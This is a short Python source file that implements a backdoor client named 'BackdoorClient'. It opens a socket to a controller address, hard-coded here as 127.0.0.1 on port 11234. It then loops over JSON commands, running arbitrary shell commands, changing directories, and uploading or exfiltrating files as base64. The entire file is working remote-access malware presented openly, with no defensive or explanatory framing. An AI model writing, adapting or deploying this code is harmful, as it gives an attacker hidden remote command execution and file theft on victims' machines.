import socket,subprocess,os,sys,json,base64

class BackdoorClient:
    def __init__(self,ipaddress,portno):
        self.ipaddress=ipaddress
        self.portno=portno
        self.socket=socket.socket()
        self.connection()

    def connection(self):
        self.socket.connect((self.ipaddress,self.portno))

    def send(self,data):
	    json_data = json.dumps(data)
	    self.socket.send(json_data.encode())


    def receive(self):
	    json_text = ""
	    while True:
		    try:        
			    json_text = json_text+self.socket.recv(1024).decode()
               
			    return json.loads(json_text)
		    except ValueError:
			    continue


    def system_commmand(self,command):
	    return subprocess.check_output(command,shell=True)


    def changing_dir(self,path):
	    os.chdir(path)
	    return path

    def writing_to_file(self,path,content):
	    with open(path,"wb") as file:
		    file.write(base64.b64decode(content))
		    return "Uploaded"

    def read_file(self,path):
	    with open(path,"rb") as file:
		    return base64.b64encode(file.read())

    def run(self):
	    while True:
		    command = self.receive()

		    try:
			    if command[0] == "exit":
				    self.connection.close()
				    exit()
			    elif command[0] == "cd" and len(command) > 1:
				    command_result = self.changing_dir(command[1])
			    elif command[0] == "download":
				    command_result = self.read_file(command[1]).decode()
			    elif command[0] == "upload":
				    command_result = self.writing_to_file(command[1],command[2])

			    else:
				    command_result = self.system_commmand(command).decode()

		    except Exception as error:
                
			    command_result = error
                
		    self.send(command_result)
            

my_backdoor = BackdoorClient("127.0.0.1",11234)
my_backdoor.run()

